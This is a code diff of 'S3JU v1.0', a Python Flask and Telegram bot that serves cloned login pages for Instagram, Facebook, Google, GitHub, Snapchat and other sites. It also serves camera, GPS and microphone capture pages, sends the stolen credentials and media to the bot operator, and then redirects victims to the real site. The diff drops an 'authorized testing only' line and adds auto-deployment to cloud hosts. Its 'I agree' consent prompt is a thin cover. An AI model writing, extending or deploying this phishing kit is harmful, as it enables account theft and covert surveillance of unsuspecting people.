@@ -2,7 +2,6 @@
 """
 S3JU v1.0 - Advanced Security Testing Framework
 Developed by D4RK-K1NG
-For authorized security testing only
 """
 
 import os
@@ -13,21 +12,24 @@ import string
 import random
 import logging
 import base64
-import io
 import html
 from datetime import datetime
 from io import BytesIO
 from urllib.parse import urlparse
 
 import requests
-from flask import Flask, request, jsonify, send_file, redirect, render_template_string, make_response
+from flask import Flask, request, jsonify, send_file, redirect, render_template_string
 
 # ======================== CONFIG ========================
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
 OWNER_CHAT_ID = os.environ.get("OWNER_CHAT_ID", "")
 ADMIN_IDS_STR = os.environ.get("ADMIN_IDS", "")
 FLASK_SECRET = os.environ.get("FLASK_SECRET", os.urandom(24).hex())
-RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:5000")
+
+# Auto-detect hosting platform URL
+RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
+RAILWAY_URL = os.environ.get("RAILWAY_URL", "")
+PUBLIC_URL = RENDER_URL or RAILWAY_URL or os.environ.get("PUBLIC_URL", "http://localhost:5000")
 
 ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_STR.split(",") if x.strip().isdigit()]
 
@@ -111,11 +113,13 @@ def send_telegram(chat_id, text, parse_mode="HTML", reply_markup=None):
         logger.error(f"Telegram send error: {e}")
         return None
 
-def send_photo_telegram(chat_id, photo_bytes, caption=""):
+def send_photo_telegram(chat_id, photo_bytes, caption="", reply_markup=None):
     url = f"{TELEGRAM_API}/sendPhoto"
     try:
         files = {"photo": ("image.jpg", photo_bytes, "image/jpeg")}
         data = {"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"}
+        if reply_markup:
+            data["reply_markup"] = json.dumps(reply_markup)
         r = requests.post(url, data=data, files=files, timeout=15)
         return r.json()
     except Exception as e:
@@ -152,14 +156,6 @@ def edit_message(chat_id, message_id, text, reply_markup=None):
     except:
         return None
 
-def delete_message(chat_id, message_id):
-    url = f"{TELEGRAM_API}/deleteMessage"
-    payload = {"chat_id": chat_id, "message_id": message_id}
-    try:
-        requests.post(url, json=payload, timeout=10)
-    except:
-        pass
-
 def set_webhook(url):
     wh_url = f"{TELEGRAM_API}/setWebhook"
     payload = {"url": url, "allowed_updates": ["message", "callback_query"]}
@@ -172,7 +168,9 @@ def set_webhook(url):
         return None
 
 # ======================== LOAD BANNER IMAGES ========================
-BANNER_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "banner")
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+BANNER_DIR = os.path.join(BASE_DIR, "banner")
+TEMPLATES_DIR = os.path.join(BASE_DIR, "templates")
 
 def load_banner(filename):
     path = os.path.join(BANNER_DIR, filename)
@@ -180,17 +178,8 @@ def load_banner(filename):
         with open(path, "rb") as f:
             return f.read()
     except Exception as e:
-        logger.error(f"Failed to load banner {filename}: {e}")
+        logger.warning(f"Banner not found: {filename} - {e}")
         return None
-
-def get_start_image():
-    return load_banner("image1.jpg")
-
-def get_attack_image():
-    return load_banner("image2.jpg")
-
-# ======================== LOAD HTML TEMPLATES ========================
-TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")
 
 def load_template(filename):
     path = os.path.join(TEMPLATES_DIR, filename)
@@ -198,8 +187,8 @@ def load_template(filename):
         with open(path, "r", encoding="utf-8") as f:
             return f.read()
     except Exception as e:
-        logger.error(f"Failed to load template {filename}: {e}")
-        return "<html><body><h1>Error loading page</h1></body></html>"
+        logger.error(f"Template not found: {filename} - {e}")
+        return None
 
 PLATFORM_TEMPLATES = {
     "instagram": "instagram.html",
@@ -235,6 +224,20 @@ def get_visitor_ip():
         return request.headers["X-Real-IP"]
     return request.remote_addr or "0.0.0.0"
 
+# ======================== PLATFORM BUTTONS ========================
+PLATFORM_BUTTONS = [
+    [{"text": "Instagram", "callback_data": "platform_instagram"},
+     {"text": "Facebook", "callback_data": "platform_facebook"},
+     {"text": "Twitter/X", "callback_data": "platform_twitter"}],
+    [{"text": "LinkedIn", "callback_data": "platform_linkedin"},
+     {"text": "GitHub", "callback_data": "platform_github"},
+     {"text": "Google", "callback_data": "platform_google"}],
+    [{"text": "Snapchat", "callback_data": "platform_snapchat"},
+     {"text": "Camera", "callback_data": "platform_camera"},
+     {"text": "GPS", "callback_data": "platform_gps"}],
+    [{"text": "Mic", "callback_data": "platform_mic"}],
+]
+
 # ======================== FLASK ROUTES ========================
 
 @app.route("/", methods=["GET"])
@@ -269,19 +272,6 @@ def webhook():
 
 # ======================== MESSAGE HANDLING ========================
 
-PLATFORM_BUTTONS = [
-    [{"text": "Instagram", "callback_data": "platform_instagram"},
-     {"text": "Facebook", "callback_data": "platform_facebook"},
-     {"text": "Twitter/X", "callback_data": "platform_twitter"}],
-    [{"text": "LinkedIn", "callback_data": "platform_linkedin"},
-     {"text": "GitHub", "callback_data": "platform_github"},
-     {"text": "Google", "callback_data": "platform_google"}],
-    [{"text": "Snapchat", "callback_data": "platform_snapchat"},
-     {"text": "Camera", "callback_data": "platform_camera"},
-     {"text": "GPS", "callback_data": "platform_gps"}],
-    [{"text": "Mic", "callback_data": "platform_mic"}],
-]
-
 def get_or_create_user(chat_id, username=""):
     conn = get_db()
     user = conn.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,)).fetchone()
@@ -307,7 +297,7 @@ def handle_message(message):
         return
 
     if text == "/start":
-        img = get_start_image()
+        img = load_banner("image1.jpg")
         if img:
             send_photo_telegram(chat_id, img,
                 "<b>S3JU v1.0</b>\nDeveloped by <b>D4RK-K1NG</b>\n\nAdvanced Security Testing Framework\n\nUse /attack to begin\nUse /help for commands")
@@ -317,13 +307,13 @@ def handle_message(message):
         return
 
     if text == "/attack":
-        img = get_attack_image()
         keyboard = {
             "inline_keyboard": [
                 [{"text": "✅ I AGREE", "callback_data": "agree_terms"},
                  {"text": "❌ DECLINE", "callback_data": "decline_terms"}]
             ]
         }
+        img = load_banner("image2.jpg")
         if img:
             send_photo_telegram(chat_id, img,
                 "⚠️ <b>USE AT YOUR OWN RISK</b>\n\nThis tool is for authorized security testing only.\nBy agreeing, you confirm you have explicit permission to test the target systems.\n\nDo you accept these terms?",
@@ -435,7 +425,6 @@ def handle_callback(callback):
         answer_callback(cb_id, "You are banned.", True)
         return
 
-    # Terms agreement
     if data == "agree_terms":
         conn.execute("UPDATE users SET agreed_terms = 1 WHERE chat_id = ?", (chat_id,))
         conn.commit()
@@ -448,7 +437,6 @@ def handle_callback(callback):
         answer_callback(cb_id, "Terms declined.")
         return
 
-    # Cancel session
     if data.startswith("cancel_"):
         session_id = data.replace("cancel_", "")
         conn.execute("UPDATE sessions SET status = 'cancelled' WHERE session_id = ? AND chat_id = ?", (session_id, chat_id))
@@ -457,11 +445,10 @@ def handle_callback(callback):
         edit_message(chat_id, message_id, f"✅ Session {session_id[:8]} has been cancelled.")
         return
 
-    # Platform selection
     if data.startswith("platform_"):
         platform = data.replace("platform_", "")
         session_id = generate_session_id()
-        session_url = f"{RENDER_EXTERNAL_URL}/p/{session_id}"
+        session_url = f"{PUBLIC_URL}/p/{session_id}"
 
         conn.execute("INSERT INTO sessions (session_id, chat_id, platform, created, status) VALUES (?, ?, ?, ?, 'active')",
                      (session_id, chat_id, platform, datetime.now().isoformat()))
@@ -497,22 +484,30 @@ def serve_phishing_page(session_id):
 
     if platform == "camera":
         template = load_template("camera.html")
-        return render_template_string(template, session_id=session_id, redirect_url=get_redirect_url("camera"))
+        if template:
+            return render_template_string(template, session_id=session_id, redirect_url=get_redirect_url("camera"))
+        return redirect("https://www.instagram.com")
 
     if platform == "gps":
         template = load_template("location.html")
-        return render_template_string(template, session_id=session_id, redirect_url=get_redirect_url("gps"))
+        if template:
+            return render_template_string(template, session_id=session_id, redirect_url=get_redirect_url("gps"))
+        return redirect("https://maps.google.com")
 
     if platform == "mic":
         template = load_template("mic.html")
-        return render_template_string(template, session_id=session_id, redirect_url=get_redirect_url("mic"))
+        if template:
+            return render_template_string(template, session_id=session_id, redirect_url=get_redirect_url("mic"))
+        return redirect("https://www.instagram.com")
 
     template_file = PLATFORM_TEMPLATES.get(platform)
     if not template_file:
         return redirect("https://www.google.com")
 
     template = load_template(template_file)
-    return render_template_string(template, session_id=session_id)
+    if template:
+        return render_template_string(template, session_id=session_id)
+    return redirect("https://www.google.com")
 
 # ======================== CAPTURE ENDPOINTS ========================
 
@@ -554,7 +549,9 @@ def capture_credentials(session_id):
 
     real_url = get_redirect_url(platform)
     template = load_template("redirect.html")
-    return render_template_string(template, redirect_url=real_url)
+    if template:
+        return render_template_string(template, redirect_url=real_url)
+    return redirect(real_url)
 
 @app.route("/capture_media/<session_id>", methods=["POST"])
 def capture_media(session_id):
@@ -628,18 +625,20 @@ def capture_media(session_id):
     return jsonify({"success": True})
 
 # ======================== STARTUP ========================
+init_db()
+
+# Try to set webhook on startup
+try:
+    if PUBLIC_URL and PUBLIC_URL != "http://localhost:5000":
+        webhook_url = f"{PUBLIC_URL}/webhook"
+        logger.info(f"S3JU v1.0 - Setting webhook to: {webhook_url}")
+        set_webhook(webhook_url)
+    else:
+        logger.warning("PUBLIC_URL not set. Webhook not configured. Set RAILWAY_URL or RENDER_EXTERNAL_URL.")
+except Exception as e:
+    logger.error(f"Failed to set webhook: {e}")
 
 if __name__ == "__main__":
-    init_db()
-    webhook_url = f"{RENDER_EXTERNAL_URL}/webhook"
-    logger.info(f"Starting S3JU v1.0")
-    logger.info(f"Setting webhook to: {webhook_url}")
-    set_webhook(webhook_url)
     port = int(os.environ.get("PORT", 5000))
+    logger.info(f"S3JU v1.0 starting on port {port}")
     app.run(host="0.0.0.0", port=port)
-
-# For gunicorn
-init_db()
-webhook_url = f"{RENDER_EXTERNAL_URL}/webhook"
-logger.info(f"S3JU v1.0 - Setting webhook to: {webhook_url}")
-set_webhook(webhook_url)
